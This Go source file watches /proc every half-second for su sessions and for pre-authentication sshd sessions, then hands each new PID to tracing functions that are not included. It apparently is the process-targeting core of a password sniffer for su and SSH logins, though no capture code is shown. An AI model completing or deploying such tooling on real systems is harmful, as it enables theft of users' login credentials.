package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	processedSUs   = make(map[int]struct{})
	processedSSHDs = make(map[int]struct{})
	mutex          = sync.Mutex{}
)

func main() {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			go hawkProcesses()
		}
	}
}

func hawkProcesses() {
	suPIDs, sshdPIDs, err := findProcesses()
	if err != nil {
		fmt.Println("Error finding processes:", err)
		return
	}

	for _, suPID := range suPIDs {
		go func(pid int) {
			mutex.Lock()
			defer mutex.Unlock()

			if _, processed := processedSUs[pid]; processed {
				return
			}
			traceSUProcess(pid)
			processedSUs[pid] = struct{}{}
		}(suPID)
	}

	for _, sshdPID := range sshdPIDs {
		go func(pid int) {
			mutex.Lock()
			defer mutex.Unlock()

			if _, processed := processedSSHDs[pid]; processed {
				return
			}
			traceSSHDProcess(pid)
			processedSSHDs[pid] = struct{}{}
		}(sshdPID)
	}
}

func findProcesses() ([]int, []int, error) {
	var suPIDs []int
	var sshdPIDs []int

	dir, err := os.Open("/proc")
	if err != nil {
		return nil, nil, err
	}
	defer dir.Close()

	entries, err := dir.Readdirnames(0)
	if err != nil {
		return nil, nil, err
	}

	for _, entry := range entries {
		pid, err := strconv.Atoi(entry)
		if err != nil {
			continue
		}

		cmdline, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
		if err != nil {
			continue
		}

		cmdlineStr := strings.ReplaceAll(string(cmdline), "\x00", " ")

		if regexp.MustCompile(`su `).MatchString(cmdlineStr) {
			suPIDs = append(suPIDs, pid)
		}

		if regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).MatchString(cmdlineStr) {
			sshdPIDs = append(sshdPIDs, pid)
		}
	}

	return suPIDs, sshdPIDs, nil
}
